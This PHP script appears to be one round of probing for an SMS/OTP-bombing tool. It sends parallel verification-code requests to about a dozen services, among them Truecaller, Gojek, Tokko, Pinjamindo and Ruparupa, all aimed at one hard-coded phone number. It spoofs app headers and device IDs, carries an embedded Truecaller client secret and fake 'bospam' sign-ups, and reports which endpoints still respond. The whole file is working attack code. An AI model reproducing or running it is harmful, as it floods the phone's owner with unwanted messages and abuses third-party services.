<?php
// Probe ronde 5: truecaller, gojek, tokko, kartuserba, jamtangan, bocil, pinjamindo, danafix + cek ulang
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$P = '6283822461998'; $L = '083822461998'; $N = '83822461998';
$R16 = bin2hex(random_bytes(8));

$EPS = [
  ['truecaller', 'POST', 'https://account-asia-south1.truecaller.com/v2/sendOnboardingOtp',
   ['Content-Type: application/json; charset=UTF-8', 'accept-encoding: gzip',
    'User-Agent: Truecaller/11.75.5 (Android;10)', 'clientsecret: lvc22mp3l1sfv6ujg83rd17btt'],
   '{"countryCode":"ID","dialingCode":"62","installationDetails":{"app":{"buildVersion":5,"majorVersion":11,"minorVersion":7,"store":"GOOGLE_PLAY"},"device":{"deviceId":"' . $R16 . '","language":"en","manufacturer":"samsung","model":"SM-A107F","osName":"Android","osVersion":"10","mobileServices":["GMS"]},"language":"en"},"phoneNumber":"' . $N . '","region":"region-2","sequenceNo":2}'],

  ['gojek', 'POST', 'https://api.gojekapi.com/v5/customers',
   ['Accept: application/json', 'X-Session-ID: f8b67b26-c6a4-44d2-9d86-8d93a80901c9', 'X-Platform: Android',
    'X-UniqueId: 8606f4e3b85968fd', 'X-AppVersion: 3.52.2', 'X-AppId: com.gojek.app', 'Authorization: Bearer',
    'X-User-Type: customer', 'X-User-Locale: id_ID', 'User-Agent: okhttp/3.12.1'],
   'email=bom' . $R16 . '@gmail.com&name=bospam' . $R16 . '&phone=+' . $P . '&signed_up_country=ID'],

  ['tokko', 'POST', 'https://api.tokko.io/graphql',
   ['Content-Type: application/json', 'Accept: */*', 'x-tokko-api-client: merchant_web',
    'x-tokko-api-client-version: 4.5.1', 'Origin: https://web.lummoshop.com', 'Referer: https://web.lummoshop.com/'],
   '{"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+' . $P . '","hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    isSuccess\n    message\n    __typename\n  }\n}\n"}'],

  ['kartuserba', 'POST', 'https://api.kartuserba.com/appserver/v1/login/verificationCode',
   ['Content-Type: application/json; charset=UTF-8', 'channel-key: GOOGLEPLAY', 'User-Agent: okhttp/3.11.0'],
   '{"code":0,"distinctId":"df857a37-421b-4a4f-ac61-6ed0e272537b","frequency":0,"phone":"' . $N . '"}'],

  ['jamtangan', 'POST', 'https://apiv2.jamtangan.com/validateuniqueid',
   ['Accept: application/json, text/plain, */*'], 'params=' . $L . '&step=2&type=sms'],

  ['bocil', 'POST', 'https://bocil.id/mobile/v1/miscallotp_request.php',
   ['User-Agent: okhttp/3.10.0'], 'user_id=&language=in&phone=' . $P . '&device_id=' . $R16 . '&retry=0'],

  ['pinjamindo', 'GET', 'https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=' . $P . '&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215',
   ['User-Agent: okhttp/3.11.0'], ''],

  ['danafix', 'POST', 'https://api.danafix.id/mob/client/verification/send',
   ['User-Agent: okhttp/4.2.0', 'Content-Type: application/json'],
   '{"client_id":"0' . $N . '","guid":"dcd0b4e8-c9f7-4fe2-b66b-5e022a14acb8","type":"new","otp_via_zalo":false}'],

  ['duniagames-v1', 'POST', 'https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',
   ['Accept: application/json, text/plain, */*', 'Content-Type: application/json',
    'Origin: https://duniagames.co.id', 'Referer: https://duniagames.co.id/'],
   '{"phoneNumber":"' . $L . '","inquiryId":"219424679"}'],

  ['adakami-gzip', 'POST', 'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
   ['Content-Type: application/json; charset=UTF-8', 'x-ada-appid: 800006', 'x-ada-os: android',
    'x-ada-channel: default', 'x-ada-role: 1', 'x-ada-appversion: 1.7.0', 'x-ada-appversion: 1.7.0'],
   '{"ketik":0,"nomor":"' . $L . '"}'],

  ['gokwik-FIX4', 'POST', 'https://gkx.gokwik.co/v4/auth/otp/login/trigger',
   ['Content-Type: application/json', 'Accept: application/json', 'gk-merchant-id: 101', 'gk-source: core',
    'gk-request-id: ' . $R16, 'Origin: https://pdp.gokwik.co', 'Referer: https://pdp.gokwik.co/'],
   '{"phone":"' . $N . '","country":"ID","channel":"SMS","dialCode":"+62"}'],

  ['ruparupa', 'POST', 'https://wapi.ruparupa.com/auth/generate-otp',
   ['Content-Type: application/json', 'Accept: application/json', 'x-company-name: odi', 'user-platform: mobile',
    'x-frontend-type: mobile', 'Origin: https://m.ruparupa.com', 'Referer: https://m.ruparupa.com/verification'],
   '{"phone":"' . $N . '","action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0}'],
];

$mh = curl_multi_init();
$cs = [];
foreach ($EPS as $i => $e) {
  $ch = curl_init();
  $hdrs = $e[3];
  if (!stripos(implode("\n", $hdrs), 'user-agent') !== false) {}
  $hasUA = false;
  foreach ($hdrs as $h) if (stripos($h, 'user-agent:') === 0) $hasUA = true;
  if (!$hasUA) $hdrs[] = 'User-Agent: ' . $UA;
  curl_setopt_array($ch, [CURLOPT_URL => $e[2], CURLOPT_HTTPHEADER => $hdrs, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 8, CURLOPT_TIMEOUT => 30, CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_ENCODING => '', CURLOPT_CUSTOMREQUEST => $e[1]]);
  if ($e[1] !== 'GET') curl_setopt($ch, CURLOPT_POSTFIELDS, $e[4]);
  curl_multi_add_handle($mh, $ch);
  $cs[$i] = $ch;
}
$running = null; $errs = [];
do {
  curl_multi_exec($mh, $running);
  while (($info = curl_multi_info_read($mh)) !== false) {
    $idx = array_search($info['handle'], $cs, true);
    if ($info['result'] !== CURLE_OK) $errs[$idx] = curl_strerror($info['result']);
  }
  curl_multi_select($mh, 1.0);
} while ($running > 0);

printf("%-16s %-5s %s\n", 'ENDPOINT', 'HTTP', 'CATATAN');
echo str_repeat('-', 96) . "\n";
foreach ($EPS as $i => $e) {
  $ch = $cs[$i];
  $body = (string) curl_multi_getcontent($ch);
  $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  if (isset($errs[$i])) $note = 'GAGAL: ' . $errs[$i];
  else {
    $flat = trim(preg_replace('/\s+/', ' ', $body));
    if (preg_match('/^(\s*<(!doctype|html))/i', $flat)) $flat = '(html) ' . substr($flat, 0, 70);
    $note = substr($flat !== '' ? $flat : '(body kosong)', 0, 260);
  }
  printf("%-16s %-5s %s\n", $e[0], $code ?: '000', $note);
  curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);
echo "\n";
